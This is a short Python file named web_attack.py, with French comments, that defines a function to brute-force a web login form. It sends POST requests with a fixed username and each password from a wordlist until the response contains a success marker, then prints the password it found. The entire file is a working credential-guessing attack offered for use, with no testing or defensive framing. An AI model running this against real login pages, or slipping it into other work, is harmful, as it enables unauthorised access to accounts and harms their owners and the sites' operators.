# web_attack.py

import requests

def web_login_brute_force(url, username, wordlist, user_field, pass_field, success_check):
    """
    Tente de se connecter à un formulaire web en testant une wordlist.
    
    - url : URL de la requête POST
    - username : identifiant fixe (ex: 'admin')
    - wordlist : liste de mots de passe à tester
    - user_field : nom du champ input du formulaire pour le login (ex: 'email')
    - pass_field : nom du champ input pour le mot de passe (ex: 'password')
    - success_check : texte indiquant que le login est réussi (ex: 'Welcome' ou 'token')
    """
    for password in wordlist:
        data = {
            user_field: username,
            pass_field: password
        }

        try:
            response = requests.post(url, data=data, timeout=5)
            if success_check in response.text:
                print(f"[✔] Mot de passe trouvé : {password}")
                return password
        except Exception as e:
            print(f"[!] Erreur avec {password} : {e}")
    
    print("[✘] Aucun mot de passe trouvé.")
    return None
